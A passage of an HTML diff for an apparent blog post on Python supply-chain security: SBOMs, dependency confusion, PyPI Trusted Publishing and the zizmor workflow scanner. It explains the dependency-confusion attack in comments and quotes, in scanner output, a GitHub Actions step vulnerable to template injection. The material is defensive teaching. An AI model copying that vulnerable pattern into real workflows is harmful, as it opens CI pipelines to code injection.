+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#89B4FA;--shiki-dark-font-style:italic">cyclonedx-py</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> environment</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> --output-file</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> sbom.json</span></span></code></pre></div><p><strong>Best practices:</strong> Use lockfiles over requirements.txt for more accurate dependency trees. Include cryptographic hashes
 to verify package integrity. Version SBOMs alongside code in source control. Generate SBOMs at build time rather than
 install time for reproducibility. The <a href=https://sbomify.com/guides/python/ target=_blank rel="noopener noreferrer">sbomify Python guide</a>
 covers these patterns
-in depth, including PEP 770 for embedding SBOMs directly in Python packages.</p><p>A CycloneDX SBOM includes package metadata with cryptographic hashes:</p><div class=code-block-wrapper><pre><code class=language-json>{
-  &#34;components&#34;: [
-    {
-      &#34;type&#34;: &#34;library&#34;,
-      &#34;name&#34;: &#34;flask&#34;,
-      &#34;version&#34;: &#34;3.1.1&#34;,
-      &#34;purl&#34;: &#34;pkg:pypi/flask@3.1.1&#34;,
-      &#34;hashes&#34;: [
-        {
-          &#34;alg&#34;: &#34;SHA-256&#34;,
-          &#34;content&#34;: &#34;d667207822...&#34;
-        }
-      ]
-    }
-  ]
-}</code></pre></div><p>It also links packages to their source repositories:</p><div class=code-block-wrapper><pre><code class=language-json>{
-  &#34;externalReferences&#34;: [
-    {
-      &#34;type&#34;: &#34;vcs&#34;,
-      &#34;url&#34;: &#34;https://github.com/pallets/flask&#34;
-    }
-  ]
-}</code></pre></div><p>Package URLs (pURLs) provide a standardized format for identifying packages across ecosystems: <code class="shiki-inline"><span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">pkg</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">:</span><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">pypi</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">/</span><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">flask</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">@</span><span style="--shiki-light:#FE640B;--shiki-dark:#FAB387">3.1</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">.</span><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">1</span></span></code>
+in depth, including PEP 770 for embedding SBOMs directly in Python packages.</p><p>A CycloneDX SBOM includes package metadata with cryptographic hashes:</p><div class=code-block-wrapper><pre class="shiki shiki-themes catppuccin-latte catppuccin-mocha" style="--shiki-light:#4c4f69;--shiki-dark:#cdd6f4;--shiki-light-bg:#eff1f5;--shiki-dark-bg:#1e1e2e" tabindex="0"><code><span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">{</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">  "</span><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA">components</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">:</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2"> [</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">    {</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">      "</span><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA">type</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">:</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> "library"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">,</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">      "</span><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA">name</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">:</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> "flask"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">,</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">      "</span><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA">version</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">:</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> "3.1.1"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">,</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">      "</span><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA">purl</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">:</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> "pkg:pypi/flask@3.1.1"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">,</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">      "</span><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA">hashes</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">:</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2"> [</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">        {</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">          "</span><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA">alg</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">:</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> "SHA-256"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">,</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">          "</span><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA">content</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">:</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> "d667207822..."</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">        }</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">      ]</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">    }</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">  ]</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">}</span></span></code></pre></div><p>It also links packages to their source repositories:</p><div class=code-block-wrapper><pre class="shiki shiki-themes catppuccin-latte catppuccin-mocha" style="--shiki-light:#4c4f69;--shiki-dark:#cdd6f4;--shiki-light-bg:#eff1f5;--shiki-dark-bg:#1e1e2e" tabindex="0"><code><span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">{</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">  "</span><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA">externalReferences</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">:</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2"> [</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">    {</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">      "</span><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA">type</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">:</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> "vcs"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">,</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">      "</span><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA">url</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">:</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> "https://github.com/pallets/flask"</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">    }</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">  ]</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">}</span></span></code></pre></div><p>Package URLs (pURLs) provide a standardized format for identifying packages across ecosystems: <code class="shiki-inline"><span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">pkg</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">:</span><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">pypi</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">/</span><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">flask</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">@</span><span style="--shiki-light:#FE640B;--shiki-dark:#FAB387">3.1</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">.</span><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">1</span></span></code>
 for Python, <code class="shiki-inline"><span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">pkg</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">:</span><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">npm</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">/@</span><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">babel</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">/</span><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">core</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">@</span><span style="--shiki-light:#FE640B;--shiki-dark:#FAB387">7.24</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">.</span><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">0</span></span></code> for npm, etc.</p><h4 id=prevent-dependency-confusion>Prevent Dependency Confusion
 <a class=heading-link href=#prevent-dependency-confusion><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
 <span class=sr-only>Link to heading</span></a></h4><p>Dependency confusion attacks exploit how package managers resolve names when you use both public and private package
 indexes. An attacker publishes a malicious package to PyPI with the same name as your internal package, and your build
-system accidentally installs the public one instead. Here&rsquo;s how the attack works with pip:</p><div class=code-block-wrapper><pre><code class=language-bash># Your pip.conf uses --extra-index-url for internal packages
-pip install --extra-index-url https://internal.corp.com/pypi mypackage
-
-# pip checks BOTH indexes and picks the highest version
-# Attacker publishes mypackage==99.0.0 on PyPI
-# pip installs the attacker&#39;s version because 99.0.0 &gt; your 1.2.3</code></pre></div><p><strong>uv is secure by default.</strong> Unlike pip, uv uses a <a href=https://docs.astral.sh/uv/concepts/indexes/ target=_blank rel="noopener noreferrer">first-match strategy</a>
+system accidentally installs the public one instead. Here&rsquo;s how the attack works with pip:</p><div class=code-block-wrapper><pre class="shiki shiki-themes catppuccin-latte catppuccin-mocha" style="--shiki-light:#4c4f69;--shiki-dark:#cdd6f4;--shiki-light-bg:#eff1f5;--shiki-dark-bg:#1e1e2e" tabindex="0"><code><span class="line"><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#9399B2;--shiki-dark-font-style:italic"># Your pip.conf uses --extra-index-url for internal packages</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#89B4FA;--shiki-dark-font-style:italic">pip</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> install</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> --extra-index-url</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> https://internal.corp.com/pypi</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> mypackage</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#9399B2;--shiki-dark-font-style:italic"># pip checks BOTH indexes and picks the highest version</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#9399B2;--shiki-dark-font-style:italic"># Attacker publishes mypackage==99.0.0 on PyPI</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#9399B2;--shiki-dark-font-style:italic"># pip installs the attacker's version because 99.0.0 > your 1.2.3</span></span></code></pre></div><p><strong>uv is secure by default.</strong> Unlike pip, uv uses a <a href=https://docs.astral.sh/uv/concepts/indexes/ target=_blank rel="noopener noreferrer">first-match strategy</a>
 -
 it stops at the first index where a package is found and won&rsquo;t search further. This prevents dependency confusion out of
-the box. You can also pin packages to specific indexes explicitly:</p><div class=code-block-wrapper><pre><code class=language-toml># pyproject.toml - pin internal packages to your private index
-[[tool.uv.index]]
-name = &#34;internal&#34;
-url = &#34;https://internal.corp.com/pypi&#34;
-explicit = true                        # only use this index for explicitly pinned packages
-
-[tool.uv.sources]
-mypackage = { index = &#34;internal&#34; }</code></pre></div><p>If you&rsquo;re still using pip, mitigate with these strategies:</p><div class=code-block-wrapper><pre><code class=language-bash># Use --index-url (single index) instead of --extra-index-url (multiple)
-# This assumes your internal index proxies public PyPI (pull-through cache).
-# If it only hosts internal packages, configure it as a PyPI proxy first.
-pip install --index-url https://internal.corp.com/pypi mypackage
-
-# Or lock down pip.conf to a single internal index
-[install]
-index-url = https://internal.corp.com/pypi
-trusted-host = internal.corp.com</code></pre></div><p>SBOMs can help detect potential naming conflicts by providing an inventory to audit, but they&rsquo;re detective controls -
+the box. You can also pin packages to specific indexes explicitly:</p><div class=code-block-wrapper><pre class="shiki shiki-themes catppuccin-latte catppuccin-mocha" style="--shiki-light:#4c4f69;--shiki-dark:#cdd6f4;--shiki-light-bg:#eff1f5;--shiki-dark-bg:#1e1e2e" tabindex="0"><code><span class="line"><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#9399B2;--shiki-dark-font-style:italic"># pyproject.toml - pin internal packages to your private index</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">[[</span><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">tool.uv.index</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">]]</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">name </span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">=</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> "internal"</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">url </span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">=</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> "https://internal.corp.com/pypi"</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">explicit </span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">=</span><span style="--shiki-light:#FE640B;--shiki-dark:#FAB387"> true</span><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#9399B2;--shiki-dark-font-style:italic">                        # only use this index for explicitly pinned packages</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">[</span><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">tool.uv.sources</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">]</span></span>
+<span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">mypackage </span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">=</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2"> {</span><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4"> index </span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">=</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> "internal"</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2"> }</span></span></code></pre></div><p>If you&rsquo;re still using pip, mitigate with these strategies:</p><div class=code-block-wrapper><pre class="shiki shiki-themes catppuccin-latte catppuccin-mocha" style="--shiki-light:#4c4f69;--shiki-dark:#cdd6f4;--shiki-light-bg:#eff1f5;--shiki-dark-bg:#1e1e2e" tabindex="0"><code><span class="line"><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#9399B2;--shiki-dark-font-style:italic"># Use --index-url (single index) instead of --extra-index-url (multiple)</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#9399B2;--shiki-dark-font-style:italic"># This assumes your internal index proxies public PyPI (pull-through cache).</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#9399B2;--shiki-dark-font-style:italic"># If it only hosts internal packages, configure it as a PyPI proxy first.</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#89B4FA;--shiki-dark-font-style:italic">pip</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> install</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> --index-url</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> https://internal.corp.com/pypi</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> mypackage</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#9399B2;--shiki-dark-font-style:italic"># Or lock down pip.conf to a single internal index</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">[</span><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">install</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">]</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#89B4FA;--shiki-dark-font-style:italic">index-url</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> =</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> https://internal.corp.com/pypi</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-light-font-style:italic;--shiki-dark:#89B4FA;--shiki-dark-font-style:italic">trusted-host</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> =</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> internal.corp.com</span></span></code></pre></div><p>SBOMs can help detect potential naming conflicts by providing an inventory to audit, but they&rsquo;re detective controls -
 they show you what you installed after the fact.</p><p><strong>Reserve specific project names</strong>: While PyPI doesn&rsquo;t support wildcard namespaces like <code class="shiki-inline"><span class="line"><span style="--shiki-light:#4C4F69;--shiki-dark:#CDD6F4">yourcompany</span><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">.</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">*</span></span></code>, you can
 manually register specific package names you use internally. This prevents attackers from registering them, though it
 requires registering each name individually.</p><p><strong>PyPI organization accounts</strong> let teams manage packages under a shared identity, providing centralized access control
@@ -495,12 +495,12 @@ by end of
 Long-lived API tokens stored in CI/CD systems remain a major risk. The GhostAction and Shai-Hulud attacks didn&rsquo;t need to
 phish any maintainer&rsquo;s password - they stole thousands of API tokens directly from GitHub repository secrets.</p><h4 id=the-old-way-risky>The Old Way (Risky)
 <a class=heading-link href=#the-old-way-risky><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
-<span class=sr-only>Link to heading</span></a></h4><div class=code-block-wrapper><pre><code class=language-yaml># Traditional approach: long-lived token
-  - uses: pypa/gh-action-pypi-publish@release/v1
-    with:
-      password: ${{ secrets.PYPI_API_TOKEN }}
-    # This token never expires
-    # Stolen once = permanent access</code></pre></div><p>The problem is obvious when you think about it. This token sits in your CI secrets indefinitely. If an attacker
+<span class=sr-only>Link to heading</span></a></h4><div class=code-block-wrapper><pre class="shiki shiki-themes catppuccin-latte catppuccin-mocha" style="--shiki-light:#4c4f69;--shiki-dark:#cdd6f4;--shiki-light-bg:#eff1f5;--shiki-dark-bg:#1e1e2e" tabindex="0"><code><span class="line"><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#9399B2;--shiki-dark-font-style:italic"># Traditional approach: long-lived token</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">  -</span><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA"> uses</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">:</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> pypa/gh-action-pypi-publish@release/v1</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA">    with</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">:</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA">      password</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">:</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> ${{ secrets.PYPI_API_TOKEN }}</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#9399B2;--shiki-dark-font-style:italic">    # This token never expires</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#9399B2;--shiki-dark-font-style:italic">    # Stolen once = permanent access</span></span></code></pre></div><p>The problem is obvious when you think about it. This token sits in your CI secrets indefinitely. If an attacker
 compromises your repository or your CI system, they get permanent access to publish packages under your name.</p><h4 id=the-new-way-trusted-publishing>The New Way: Trusted Publishing
 <a class=heading-link href=#the-new-way-trusted-publishing><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
 <span class=sr-only>Link to heading</span></a></h4><p><a href=https://docs.pypi.org/trusted-publishers/ target=_blank rel="noopener noreferrer">Trusted Publishing</a>
@@ -518,19 +518,19 @@ provides detailed setup instructions. The authentication flow:</p><pre class=mer
     PyPI-&gt;&gt;GHA: 4. Return temporary API key
     GHA-&gt;&gt;PyPI: 5. Upload package
     Note over GHA,PyPI: Key expires in minutes
-</pre><p>Configure Trusted Publishing in your workflow (and register the Trusted Publisher in PyPI):</p><div class=code-block-wrapper><pre><code class=language-yaml>permissions:
-  contents: read
-  id-token: write
-
-jobs:
-  publish:
-    runs-on: ubuntu-latest
-    environment: release
-    steps:
-      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4.3.1
-      - uses: astral-sh/setup-uv@d4b2f3b6ecc6e67c4457f6d3e41ec42d3d0fcb86 # v5.4.2
-      - uses:
-          pypa/gh-action-pypi-publish@7f25271a4aa483500f742f9492b2ab5648d61011     # v1.12.4</code></pre></div><p>The security improvements are substantial. There are no long-lived secrets to steal, and credentials rotate on every
+</pre><p>Configure Trusted Publishing in your workflow (and register the Trusted Publisher in PyPI):</p><div class=code-block-wrapper><pre class="shiki shiki-themes catppuccin-latte catppuccin-mocha" style="--shiki-light:#4c4f69;--shiki-dark:#cdd6f4;--shiki-light-bg:#eff1f5;--shiki-dark-bg:#1e1e2e" tabindex="0"><code><span class="line"><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA">permissions</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">:</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA">  contents</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">:</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> read</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA">  id-token</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">:</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> write</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA">jobs</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">:</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA">  publish</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">:</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA">    runs-on</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">:</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> ubuntu-latest</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA">    environment</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">:</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> release</span></span>
+<span class="line"><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA">    steps</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">:</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">      -</span><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA"> uses</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">:</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5</span><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#9399B2;--shiki-dark-font-style:italic"> # v4.3.1</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">      -</span><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA"> uses</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">:</span><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1"> astral-sh/setup-uv@d4b2f3b6ecc6e67c4457f6d3e41ec42d3d0fcb86</span><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#9399B2;--shiki-dark-font-style:italic"> # v5.4.2</span></span>
+<span class="line"><span style="--shiki-light:#7C7F93;--shiki-dark:#9399B2">      -</span><span style="--shiki-light:#1E66F5;--shiki-dark:#89B4FA"> uses</span><span style="--shiki-light:#179299;--shiki-dark:#94E2D5">:</span></span>
+<span class="line"><span style="--shiki-light:#40A02B;--shiki-dark:#A6E3A1">          pypa/gh-action-pypi-publish@7f25271a4aa483500f742f9492b2ab5648d61011</span><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#9399B2;--shiki-dark-font-style:italic">     # v1.12.4</span></span></code></pre></div><p>The security improvements are substantial. There are no long-lived secrets to steal, and credentials rotate on every
 workflow run. The short-lived, scoped tokens reduce the exposure window to minutes instead of forever. You also get
 provenance tracking through Sigstore transparency logs.</p><p>OIDC alone isn&rsquo;t a silver bullet though. If an attacker can modify your workflow file (via a compromised dependency, a
 malicious PR merged without review, or a GitHub Actions supply chain attack like GhostAction), they can trigger a
@@ -547,52 +547,52 @@ is a static analysis tool that finds security issues in GitHub Actions workflows
 template injection, unpinned actions, excessive permissions, credential leaks, and
 <a href=https://docs.zizmor.sh/audits/ target=_blank rel="noopener noreferrer">30+ other audit rules</a>
 . It&rsquo;s particularly relevant here because the GhostAction attack
-exploited exactly the kind of workflow vulnerabilities zizmor detects.</p><p>Run it against your repository:</p><div class=code-block-wrapper><pre><code class=language-bash># Scan all workflows in the current repo
-uvx zizmor .
-
-# Scan with a GitHub token for online checks (detects impostor commits, known CVEs in actions)
-uvx zizmor --gh-token $(gh auth token) .
-
-# Output as JSON or SARIF for CI integration
-uvx zizmor --format=sarif . &gt; results.sarif</code></pre></div><p>Example output:</p><div class=code-block-wrapper><pre><code class=language-text>warning[excessive-permissions]: overly broad permissions
-  --&gt; .github/workflows/ci.yml:4:1
-   |
- 4 | permissions: write-all
-   | ^^^^^^^^^^^^^^^^^^^^^ this permission is overly broad
-   |
-   = note: audit confidence → High
-
-error[template-injection]: code injection via template expansion
-  --&gt; .github/workflows/comment.yml:15:9
-   |
-15 |     run: echo &#34;${{ github.event.issue.title }}&#34;
-   |          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ attacker-controlled input in run step</code></pre></div><p>Add it to your pre-commit hooks to catch issues before they&rsquo;re pushed:</p><div class=code-block-wrapper><pre><code class=language-yaml># .pre-commit-config.yaml
-- repo: https://github.com/zizmorcore/zizmor-pre-commit
-  rev: v1.22.0
-  hooks:
-  - id: zizmor</code></pre></div><p>Or run it in CI to audit workflows on every PR. The
+exploited exactly the kind of workflow vulnerabilities zizmor detects.</p><p>Run it against your repository:</p><div class=code-block-wrapper><pre class="shiki shiki-themes catppuccin-latte catppuccin-mocha" style="--shiki-light:#4c4f69;--shiki-dark:#cdd6f4;--shiki-light-bg:#eff1f5;--shiki-dark-bg:#1e1e2e" tabindex="0"><code><span class="line"><span style="--shiki-light:#7C7F93;--shiki-light-font-style:italic;--shiki-dark:#9399B2;--shiki-dark-font-style:italic"># Scan all workflows in the current repo</span></span>
